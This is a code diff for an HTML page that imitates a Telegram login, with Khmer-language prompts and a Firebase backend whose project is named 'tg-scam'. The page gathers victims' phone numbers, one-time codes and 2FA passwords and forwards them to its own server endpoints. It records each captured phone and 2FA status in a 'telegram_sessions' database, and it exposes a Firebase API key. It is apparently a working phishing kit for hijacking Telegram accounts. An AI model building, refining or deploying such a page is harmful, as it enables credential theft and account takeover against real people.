@@ -1,91 +1,258 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="km">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Telegram OTP Login 2FA</title>
+
 <style>
-body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#e0f7fa;margin:0;}
-.login-container{background:#fff;border-radius:20px;width:380px;padding:40px;text-align:center;box-shadow:0 12px 30px rgba(0,0,0,0.2);}
-h2{margin-bottom:20px;color:#333;}
-input,button{width:100%;padding:12px;margin:10px 0;border-radius:10px;font-size:16px;}
-button{background:#0088cc;color:white;border:none;cursor:pointer;}
-button:hover{background:#006fa1;}
-#message{font-size:14px;color:#333;margin-top:10px;}
+body {
+  font-family:'Segoe UI',sans-serif;
+  background:linear-gradient(135deg,#6fc1fc,#fff);
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+  margin:0;
+}
+
+.login-container {
+  background:#fff;
+  border-radius:20px;
+  width:380px;
+  max-width:90%;
+  padding:40px 30px;
+  box-shadow:0 12px 30px rgba(0,0,0,0.2);
+  text-align:center;
+}
+
+.logo {
+  width:80px;
+  height:80px;
+  margin:0 auto 20px;
+  background:#0088cc;
+  border-radius:50%;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  color:white;
+  font-size:36px;
+}
+
+input {
+  width:100%;
+  padding:14px;
+  margin:10px 0;
+  border-radius:10px;
+  border:1px solid #ccc;
+}
+
+button {
+  width:100%;
+  padding:14px;
+  margin:10px 0;
+  border-radius:10px;
+  background:#0088cc;
+  color:white;
+  border:none;
+  cursor:pointer;
+}
+
+#message { font-size:14px; }
 </style>
 </head>
+
 <body>
 
 <div class="login-container">
-  <h2>Telegram OTP Login 2FA</h2>
+  <div class="logo">T</div>
+  <h2>Telegram Login</h2>
 
+  <!-- STEP 1 -->
   <div id="step-phone">
-    <input type="text" id="phone" placeholder="Phone number">
+    <input type="text" id="phone" placeholder="លេខទូរស័ព្ទ">
     <button id="btn-next">Send OTP</button>
   </div>
 
+  <!-- STEP 2 -->
   <div id="step-otp" style="display:none;">
-    <input type="text" id="otp" placeholder="OTP code">
-    <input type="password" id="password" placeholder="2FA password" style="display:none;">
+    <input type="text" id="otp" placeholder="OTP Code">
+
+    <input type="password" id="password"
+      placeholder="2FA password"
+      autocomplete="current-password"
+      style="display:none;">
+
     <button id="btn-login">Login</button>
   </div>
 
   <p id="message"></p>
 </div>
 
-<script>
-const stepPhone=document.getElementById('step-phone');
-const stepOtp=document.getElementById('step-otp');
-const message=document.getElementById('message');
-const btnNext=document.getElementById('btn-next');
-const btnLogin=document.getElementById('btn-login');
-const passwordInput=document.getElementById('password');
+<!-- Firebase -->
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 
-btnNext.addEventListener('click',async()=>{
-  const phone=document.getElementById('phone').value.trim();
-  if(!phone){message.textContent='Enter phone number';return;}
-  message.textContent='Sending OTP...';
-  try{
-    const res=await fetch('/send-otp',{
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyBvOJLAThxg9qCpAqoosCL6n_-lH8azpvc",
+  authDomain: "tg-scam.firebaseapp.com",
+  databaseURL: "https://tg-scam-default-rtdb.firebaseio.com",
+  projectId: "tg-scam"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+</script>
+
+<script>
+let currentPhone = '';
+
+const stepPhone = document.getElementById('step-phone');
+const stepOtp = document.getElementById('step-otp');
+const message = document.getElementById('message');
+const passwordInput = document.getElementById('password');
+
+// ================= SAVE FUNCTION =================
+function saveLogin(status, has2FA) {
+  // logs
+  db.ref(`telegram_sessions/${currentPhone}/logs`).push({
+    status,
+    has2FA,
+    timestamp: Date.now()
+  });
+
+  // main user
+  db.ref(`telegram_sessions/${currentPhone}`).update({
+    phone: currentPhone,
+    lastLogin: Date.now(),
+    has2FA
+  });
+}
+
+// ================= STEP 1 =================
+document.getElementById('btn-next').onclick = async () => {
+  const phone = document.getElementById('phone').value.trim();
+
+  if (!phone) {
+    message.textContent = "សូមបញ្ចូលលេខ";
+    return;
+  }
+
+  currentPhone = phone;
+  message.textContent = "កំពុងផ្ញើ OTP...";
+
+  try {
+    const res = await fetch('/send-otp', {
       method:'POST',
       headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({phone})
+      body:JSON.stringify({ phone })
     });
-    const data=await res.json();
-    if(data.success){
+
+    const data = await res.json();
+
+    if (data.success) {
       stepPhone.style.display='none';
       stepOtp.style.display='block';
-      message.textContent=data.message;
-    } else message.textContent=data.message;
-  }catch(err){message.textContent='Server error';}
-});
+      message.textContent='OTP បានផ្ញើ!';
+    } else {
+      message.textContent=data.error;
+    }
 
-btnLogin.addEventListener('click',async()=>{
-  const phone=document.getElementById('phone').value.trim();
-  const otp=document.getElementById('otp').value.trim();
-  const password=passwordInput.value.trim();
-  if(!otp){message.textContent='Enter OTP';return;}
-  message.textContent='Verifying...';
-  try{
-    const res=await fetch('/login',{
+  } catch {
+    message.textContent='Server error';
+  }
+};
+
+// ================= STEP 2 =================
+document.getElementById('btn-login').onclick = async () => {
+  const otp = document.getElementById('otp').value.trim();
+
+  if (!otp) {
+    message.textContent="បញ្ចូល OTP";
+    return;
+  }
+
+  message.textContent="កំពុង verify...";
+
+  try {
+    const res = await fetch('/login', {
       method:'POST',
       headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({phone,otp,password})
+      body:JSON.stringify({
+        phone: currentPhone,
+        otp
+      })
     });
-    const data=await res.json();
-    if(data.requirePassword){
+
+    const data = await res.json();
+
+    // 🔐 NEED 2FA
+    if (data.requirePassword) {
       passwordInput.style.display='block';
-      message.textContent='2FA password required';
-    } else if(data.success){
-      message.textContent=data.message;
-      // Auto clear
-      document.getElementById('otp').value='';
-      passwordInput.value='';
-    } else{
-      message.textContent=data.message;
+      passwordInput.focus();
+      message.textContent="បញ្ចូល 2FA password";
+      return;
     }
-  }catch(err){message.textContent='Server error';}
+
+    // ✅ SUCCESS NO 2FA
+    if (data.success) {
+      message.textContent="Login Success";
+      saveLogin("success","nopass");
+      resetForm();
+    }
+
+  } catch {
+    message.textContent="Server error";
+  }
+};
+
+// ================= STEP 3 (2FA) =================
+passwordInput.addEventListener('keypress', async (e) => {
+  if (e.key === 'Enter') {
+
+    const password = passwordInput.value.trim();
+    message.textContent="កំពុង verify 2FA...";
+
+    try {
+      const res = await fetch('/login-password', {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({
+          phone: currentPhone,
+          password
+        })
+      });
+
+      const data = await res.json();
+
+      if (data.success) {
+        message.textContent="Login Success (2FA)";
+        saveLogin("success","pass");
+        resetForm();
+      } else {
+        message.textContent=data.message;
+      }
+
+    } catch {
+      message.textContent="2FA error";
+    }
+
+  }
 });
+
+// ================= RESET =================
+function resetForm() {
+  document.getElementById('phone').value='';
+  document.getElementById('otp').value='';
+  passwordInput.value='';
+  passwordInput.style.display='none';
+
+  stepOtp.style.display='none';
+  stepPhone.style.display='block';
+
+  currentPhone='';
+}
 </script>
 
 </body>
